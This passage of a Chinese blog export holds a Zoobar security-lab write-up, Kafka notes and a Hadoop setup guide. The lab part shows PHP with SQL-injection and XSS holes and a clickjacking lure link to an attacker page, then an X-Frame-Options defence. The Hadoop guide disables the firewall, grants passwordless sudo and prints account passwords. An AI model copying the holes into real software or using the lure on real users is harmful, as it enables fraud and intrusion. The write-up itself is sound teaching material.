class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line">     <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h3><p>1.修改clickjacking的profile</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com/clickjacking.html&quot;</span>&gt;</span>点击赢大奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.当用户victim去查看clickjacking的profile时，并点击链接，会出现如下网页（只要将clickjacking.html中opacity设置为0，原页面就完全看不到）</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234359.png" alt="截屏2021-01-08 下午8.39.16"></p>
<p>因为第一次提交的表单没有token字段，所以csrf攻击不成功，但是此时已经将表单填好了，只要用户点击win，就会向clickjacking转1个zoobars。</p>
<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><h4 id="方法一-X-FRAME-OPTIONS"><a href="#方法一-X-FRAME-OPTIONS" class="headerlink" title="方法一:X-FRAME-OPTIONS"></a>方法一:X-FRAME-OPTIONS</h4><p>1.配置 Apache 在所有页面上发送 X-Frame-Options 响应头</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-available/000-default.conf</span><br></pre></td></tr></table></figure>

<p>在里面加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Header always append X-Frame-Options DENY</span><br></pre></td></tr></table></figure>

<p>重启apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo a2enmod headers</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka</title>
    <url>/2021/12/21/%E5%A4%A7%E6%95%B0%E6%8D%AE/Kafka/</url>
    <content><![CDATA[<h1 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h1><p>消费者组提升消费能力，如果消费者组内的消费者数大于partition数就没有意义了，并发度最好的时候是消费者和分区数一样的时候。</p>
<p>消费者已拉取的方式通信。</p>
<p>follower只能在leader挂了的时候才有用，其他时候只是一个备份</p>
<p>​            <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211830093.png" alt="image-20211018200516549"></p>
<p>为什么高版本不用zk</p>
<p>一边拉消息，一边还要与zk连接，效率不高</p>
<p>kafka的消息存在磁盘，一般存7天</p>
<p>消息什么时候删除</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i start kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-start.sh -daemon /opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">        for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">        do</span><br><span class="line">        echo &quot;===========$i stop kafka===========&quot;</span><br><span class="line">        ssh $i &#x27;/opt/module/kafka/bin/kafka-server-stop.sh /opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一次12条，超过10条，leader先写，followers都被提出ISR，所以不用条数，而用时间</p>
<p>消费者挂了一个就重新分配</p>
<p>按topic、分区和消费者组来保存偏移量</p>
<p>生产者挂了，pid变了  还是会写多份</p>
<p>这里就需要说说为什么要设计分区：<br> 首先Topic中有分区的概念，每个分区保存各自的数据，而我们的Group这对应着Topic，也就是这个Topic中的数据都是由该Group去消费，也就是允许多个消费者同时消费，这样能大大提高Kafka的吞吐量。不过这样的设计也会带来不少的不便，比如特定场景下你需要去维护多个Partition之间的关系。这里就不多讲了。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-1 Hadoop环境安装</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-1%20Hadoop%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="Lab-1-Hadoop环境安装"><a href="#Lab-1-Hadoop环境安装" class="headerlink" title="Lab-1 Hadoop环境安装"></a>Lab-1 Hadoop环境安装</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="Hadoop是什么"><a href="#Hadoop是什么" class="headerlink" title="Hadoop是什么"></a>Hadoop是什么</h3><p>Hadoop是一个由Apache基金会所发布的分布式系统基础架构，主要解决海量数据的存储和海量数据的分析计算问题，广义来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。</p>
<p>Google是Hadoop的思想之源，GFS-&gt;HDFS，Map-Reduce-&gt;MR，Bigtable-&gt;HBase</p>
<h3 id="GFS（Google-File-System）"><a href="#GFS（Google-File-System）" class="headerlink" title="GFS（Google-File-System）"></a>GFS（Google-File-System）</h3><p>一个面向大规模数据密集型应用的、可伸缩的分布式文件系统。</p>
<ul>
<li>认为组件失效是一种常态，提供了容错机制，自动负载均衡，使得分布式文件系统可以在廉价机器上运行</li>
<li>面向大文件存储，文件通常在100MB或者以上，数个GB大小的文件也是普遍存在的</li>
<li>绝大部分文件的修改是采用在文件尾部追加数据，很少有随机写</li>
<li>应用程序和文件系统 API 的协同设计提高了整个系统的灵活性</li>
</ul>
<h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>一个 GFS 集群包含一个单独的 Master 节点、多台 Chunk 服务器，并且同时被多个客户端访问，如图 所示。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046843.png" alt="img"></p>
<h3 id="Map-Reduce"><a href="#Map-Reduce" class="headerlink" title="Map-Reduce"></a>Map-Reduce</h3><p>总的来讲，Google MapReduce 所执行的分布式计算会以一组键值对作为输入，输出另一组键值对，用户则通过编写 Map 函数和 Reduce 函数来指定所要进行的计算。</p>
<p>由用户编写的Map 函数将被应用在每一个输入键值对上，并输出若干键值对作为中间结果。之后，MapReduce 框架则会将与同一个键$I$相关联的值都传递到同一次 Reduce 函数调用中。</p>
<p>同样由用户编写的 Reduce 函数以键$I$以及与该键相关联的值的集合作为参数，对传入的值进行合并并输出合并后的值的集合。</p>
<h4 id="Map-Reduce计算过程"><a href="#Map-Reduce计算过程" class="headerlink" title="Map-Reduce计算过程"></a>Map-Reduce计算过程</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046858.jpg" alt="preview"></p>
<p>首先，用户通过 MapReduce 客户端指定 Map 函数和 Reduce 函数，以及此次 MapReduce 计算的配置，包括中间结果键值对的 Partition 数量 $R$以及用于切分中间结果的哈希函数$hash$<br>用户开始 MapReduce 计算后，整个 MapReduce 计算的流程可总结如下：</p>
<ol>
<li>作为输入的文件会被分为$M$个 Split，每个 Split 的大小通常在 16~64 MB 之间</li>
<li>如此，整个 MapReduce 计算包含$M$个Map 任务和 $R$个 Reduce 任务。Master 结点会从空闲的 Worker 结点中进行选取并为其分配 Map 任务和 Reduce 任务</li>
<li>收到 Map 任务的 Worker 们（又称 Mapper）开始读入自己对应的 Split，将读入的内容解析为输入键值对并调用由用户定义的 Map 函数。由 Map 函数产生的中间结果键值对会被暂时存放在缓冲内存区中</li>
<li>在 Map 阶段进行的同时，Mapper 们周期性地将放置在缓冲区中的中间结果存入到自己的本地磁盘中，同时根据用户指定的 Partition 函数（默认为 $hash(key) mod R$ ）将产生的中间结果分为$R$ 个部分。任务完成时，Mapper 便会将中间结果在其本地磁盘上的存放位置报告给 Master</li>
<li>Mapper 上报的中间结果存放位置会被 Master 转发给 Reducer。当 Reducer 接收到这些信息后便会通过 RPC 读取存储在 Mapper 本地磁盘上属于对应 Partition 的中间结果。在读取完毕后，Reducer 会对读取到的数据进行排序以令拥有相同键的键值对能够连续分布</li>
<li>之后，Reducer 会为每个键收集与其关联的值的集合，并调用用户定义的 Reduce 函数。Reduce 函数的结果会被放入到对应的 Reduce Partition 结果文件</li>
</ol>
<p>实际上，在一个 MapReduce 集群中，Master 会记录每一个 Map 和 Reduce 任务的当前完成状态，以及所分配的 Worker。除此之外，Master 还负责将 Mapper 产生的中间结果文件的位置和大小转发给 Reducer。</p>
<p>值得注意的是，每次 MapReduce 任务执行时， $M$和$R$  的值都应比集群中的 Worker 数量要高得多，以达成集群内负载均衡的效果。</p>
<h3 id="Bigtable"><a href="#Bigtable" class="headerlink" title="Bigtable"></a>Bigtable</h3><h4 id="Bigtable是什么"><a href="#Bigtable是什么" class="headerlink" title="Bigtable是什么"></a>Bigtable是什么</h4><p>Bigtable是一个分布式的数据存储系统，用来管理那些被设计为可以横跨上万台机器，达海量级别的结构化数据。</p>
<p>一个Bigtable是一个稀疏的，分布式的，持久化的，多维度的有序Map。<br>这个Map通过行键（row key），列键（column key）和时间戳来进行索引：<br>(row:string, column:string, time:int64) → string</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046865.png" alt="Google论文之Bigtable详解-图1"></p>
<p>上面是一个用于存储海量网页的大表的结构，<br>以反转的URL作为row行名，以网页内容contents作为column列名，将网页中的锚点保存在anchor列簇中。<br>contents列有3个版本，分别是t3,t5,t6，通过timestamp字段来区分版本。</p>
<p>Bigtable不支持完整的关系数据模型，相反，它提供给客户端一种非常简单的数据模型，<br>能够支持动态的控制数据布局和数据格式（data layout and format），并且允许客户端推导出数据存储在底层具体位置。</p>
<p>具体的数据是通过行名（row name）和列名（column name）来进行索引的，行名和列名可以是任意的字符串。</p>
<p>客户端可以通过仔细设计的schemas来控制数据的所在位置，以达到是从内存还是磁盘获取数据。<br>并且大表Bigtable针对每行（row）的读写都是原子性的。</p>
<p>为了减轻管理许多不同版本数据的负担，客户端自定义设置保存最后n个或者n天内的数据版本。</p>
<h4 id="Bigtable核心概念"><a href="#Bigtable核心概念" class="headerlink" title="Bigtable核心概念"></a>Bigtable核心概念</h4><p><strong>column key 列键</strong></p>
<p>列键使用以下语法：列簇名:修饰符。比如上面的anchor:cnnsi.com就是一个列键，列簇名是anchor:，修饰符是cnnsi.com。</p>
<p><strong>column family 列簇</strong></p>
<p>列键组成在一起的集合称作列簇，是最基本的访问控制单元。<br>是将相似的一类信息放在一起，但是却分成多个列来存储，这样是为了高效的读取数据。</p>
<p>列簇必须先创建，才能在列簇下面的列中进行数据存取。 在找列簇之前也可以通过指定row keys进行寻址，这样可以更快的定位到数据，具有更佳的性能。</p>
<p>虽然一张大表支持的唯一名列簇的数量较少（最多只有数百），而且列簇在操作期间尽量少改变。 但是，我们可以无限拓展大表中的列数量。</p>
<p>访问控制和磁盘或内存的核算都在列簇级别进行。</p>
<p>客户端可以将多个列簇组合在一起，成为一个存储位置分组（locality group）。<br>针对每个tablet的存储位置分组会生成一个单独的SSTable。</p>
<p>之所以分开列簇，是为了防止寻找数据时被一起访问，从而更有效的进行数据读取。</p>
<p><strong>tablet 表块</strong></p>
<p>和传统关系数据库一样，一个表有很多行（row），由很多行组成的行范围（row range）就是一个tablet（这里翻译为表块），<br>比如第1000~1500行，就是一个tablet。表块是被动态划分的（但相邻的应该在一起），它是分发和负载均衡得基本单位。</p>
<h4 id="Bigtable具体实现"><a href="#Bigtable具体实现" class="headerlink" title="Bigtable具体实现"></a>Bigtable具体实现</h4><p>Bigtable主要由3个部分组成：</p>
<ul>
<li>每个客户端使用的lib</li>
<li>master服务器</li>
<li>多个tablet服务器</li>
</ul>
<p>master负责分配tablets给tablet服务器，并监控，探测tablet服务器的增加和失效，负责tablet的复杂均衡，对GFS上的文件进行垃圾回收。</p>
<p>master还处理表或者列簇的创建导致的schema的改变。</p>
<p>tablet服务器管理一系列的tablets，并负责处理它们的读写请求，以及当tablets太大时的切割操作。</p>
<p>一个Bigtable集群有许多的大表，每个大表包有一系列的tablets组成，每个tables由一定范围的rows组成。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="准备一个模版虚拟机"><a href="#准备一个模版虚拟机" class="headerlink" title="准备一个模版虚拟机"></a>准备一个模版虚拟机</h3><p>用Parallels Desktop安装centos 7.5，设置静态 ip10.211.55.3，主机名为hadoop100</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改主机名</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="克隆虚拟机"><a href="#克隆虚拟机" class="headerlink" title="克隆虚拟机"></a>克隆虚拟机</h3><p>利用模版虚拟机克隆三台虚拟机 hadoop102(10.211.55.4) hadoop103(10.211.55.5) hadoop104(10.211.55.6)，克隆的时候先关闭虚拟机</p>
<h4 id="修改克隆机的主机名和hosts，已hadoop102为例"><a href="#修改克隆机的主机名和hosts，已hadoop102为例" class="headerlink" title="修改克隆机的主机名和hosts，已hadoop102为例"></a>修改克隆机的主机名和hosts，已hadoop102为例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>其他虚拟机以相同方式去修改</p>
<h4 id="修改主机Mac的hosts"><a href="#修改主机Mac的hosts" class="headerlink" title="修改主机Mac的hosts"></a>修改主机Mac的hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line">10.211.55.3 hadoop100</span><br><span class="line">10.211.55.4 hadoop102</span><br><span class="line">10.211.55.5 hadoop103</span><br><span class="line">10.211.55.6 hadoop104</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装JDK"><a href="#在hadoop102安装JDK" class="headerlink" title="在hadoop102安装JDK"></a>在hadoop102安装JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">将mac中下载好的jdk导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">查看是否导入成功</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 190444</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6月  28 00:09 jdk-8u212-linux-x64.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line">java version &quot;1.8.0_212&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_212-b10)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.212-b10, mixed mode)</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装Hadoop"><a href="#在hadoop102安装Hadoop" class="headerlink" title="在hadoop102安装Hadoop"></a>在hadoop102安装Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">将mac中下载好的hadoop导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br><span class="line">Hadoop 3.1.3</span><br><span class="line">Source code repository https://gitbox.apache.org/repos/asf/hadoop.git -r ba631c436b806728f8ec2f54ab1e289526c90579</span><br><span class="line">Compiled by ztang on 2019-09-12T02:47Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From source with checksum ec785077c385118ac91aadde5ec9799</span><br><span class="line">This command was run using /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-common-3.1.3.jar</span><br></pre></td></tr></table></figure>

<h3 id="Hadoop目录结构"><a href="#Hadoop目录结构" class="headerlink" title="Hadoop目录结构"></a>Hadoop目录结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin 目录:存放对 Hadoop 相关服务(hdfs，yarn，mapred)进行操作的脚本 </li>
<li>etc 目录:Hadoop 的配置文件目录，存放 Hadoop 的配置文件</li>
<li>lib 目录:存放 Hadoop 的本地库(对数据进行压缩解压缩功能)</li>
<li>sbin 目录:存放启动或停止 Hadoop 相关服务的脚本</li>
<li>share 目录:存放 Hadoop 的依赖 jar 包、文档、和官方案例</li>
</ul>
<h3 id="编写集群分发脚本"><a href="#编写集群分发脚本" class="headerlink" title="编写集群分发脚本"></a>编写集群分发脚本</h3><h4 id="rsync和scp的区别"><a href="#rsync和scp的区别" class="headerlink" title="rsync和scp的区别"></a>rsync和scp的区别</h4><p>rsync 主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。</p>
<p>rsync 和 scp 区别:用 rsync 做文件的复制要比 scp 的速度快，rsync 只对差异文件做更</p>
<p>新。scp 是把所有文件都复制过去。</p>
<h4 id="编写xsync集群分发脚本"><a href="#编写xsync集群分发脚本" class="headerlink" title="编写xsync集群分发脚本"></a>编写xsync集群分发脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>添加一下内容：</p>
